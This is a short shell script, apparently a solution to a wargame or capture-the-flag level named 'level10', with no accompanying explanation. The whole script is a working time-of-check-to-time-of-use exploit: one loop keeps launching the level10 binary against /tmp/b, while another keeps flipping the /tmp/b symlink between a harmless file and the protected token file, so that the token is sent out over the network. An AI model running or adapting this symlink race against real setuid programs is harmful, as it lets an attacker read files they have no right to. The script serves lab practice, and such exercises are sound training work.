#!/bin/sh

echo "a" > /tmp/a

send_file()
{
	while true
	do
		/home/user/level10/level10 /tmp/b 127.0.0.1 > /dev/null &
	done
}

swap_files()
{
	while true
	do
		ln -fs /tmp/a /tmp/b &
		ln -fs /home/user/level10/token /tmp/b
	done
}

send_file &
swap_files
